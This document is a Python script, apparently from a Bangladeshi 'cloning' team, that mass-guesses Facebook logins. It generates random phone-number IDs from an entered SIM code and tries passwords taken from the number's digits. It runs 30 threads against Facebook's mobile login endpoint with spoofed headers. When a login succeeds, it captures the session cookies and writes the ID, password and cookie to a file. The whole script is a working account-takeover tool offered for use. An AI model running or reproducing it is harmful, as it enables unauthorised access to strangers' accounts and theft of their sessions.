import os, time, sys, uuid, random, requests, re
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Color Codes
G = '\033[1;32m'; W = '\033[1;37m'; R = '\033[1;31m'; Y = '\033[1;33m'
B = '\033[1;34m'; P = '\033[1;35m'
loop = 0; ok = []

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{P}     ██      ██  ███████     ██    ██   ██ 
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}
| [✓] DEVELOPED BY : MD MALEK ISLAM            |
| [✓] TEAM         : CYBER STRIKER TEAM        |
| [✓] STATUS       : REAL REFACTORED (META)    |
{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}""")

def main():
    banner()
    print(f'{G}[1] NUMBER COOKIE CLONING')
    print(f'[0] EXIT')
    choose = input(f'{Y}[▼] CHOOSE : {W}')
    if choose == '1':
        cloning_start()
    else: sys.exit()

def cloning_start():
    banner()
    code = input(f'{G}[+] ENTER SIM CODE: {W}')
    try:
        limit = int(input(f'{G}[•] PUT CLONING LIMIT: {W}'))
    except: limit = 5000
    
    banner()
    print(f'{G}[+] TARGET : RANDOM CLONING (BD)')
    print(f'[+] TOTAL IDS: {limit} | PASS: LAST 6 DIGITS')
    print(f'[+] PROCESS STARTED... (RESPONSE LOGIC)')
    print(f'×××××××××××××××××××××××××××××××××××××××××××××××××{W}\n')

    # Multi-threading for Laptop/Termux performance
    with ThreadPool(max_workers=30) as jilani_pool:
        for _ in range(limit):
            # UID logic for 11 digit numbers
            num = str(random.randint(1111111, 9999999))
            uid = code + num
            # Password logic: Last 6 digits (Real Logic)
            pws = [num[-6:], uid] 
            jilani_pool.submit(login_api, uid, pws, limit)

    print(f'\n{G}×××××××××××××××××××××××××××××××××××××××××××××××××')
    print(f'[+] CLONING COMPLETE | TOTAL OK: {len(ok)}')
    input(f' [ BACK ]{W}')
    main()

def login_api(uid, pws, limit):
    global loop, ok
    sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{len(ok)}]'); sys.stdout.flush()
    
    for pas in pws:
        session = requests.Session()
        # Real Headers (R-Header) for Vivo V2055
        ua = "Mozilla/5.0 (Linux; Android 13; V2055) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36"
        
        headers = {
            'authority': 'touch.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://touch.facebook.com',
            'referer': 'https://touch.facebook.com/',
            'user-agent': ua,
            'x-fb-lsd': 'true',
        }
        
        # Async Endpoint with Response Logic
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        
        data = {
            "lsd": "AVpY", 
            "jazoest": "2931",
            "email": uid,
            "pass": pas,
        }

        try:
            response = session.post(url, data=data, headers=headers, timeout=30)
            cookies = session.cookies.get_dict()
            
            # Real Cookie Extraction Logic
            if "c_user" in cookies:
                kuki = (";").join([f"{k}={v}" for k, v in cookies.items()])
                print(f'\n{G}[MALEK-OK💚] {uid} • {pas} xxx') 
                print(f'{G}[🌺] COOKIE = {kuki}\n')
                ok.append(uid)
                # Auto-save to file
                with open('ok.txt', 'a') as f:
                    f.write(f'{uid}|{pas}|{kuki}\n')
                break
        except:
            pass
    loop += 1

if __name__ == "__main__":
    main()
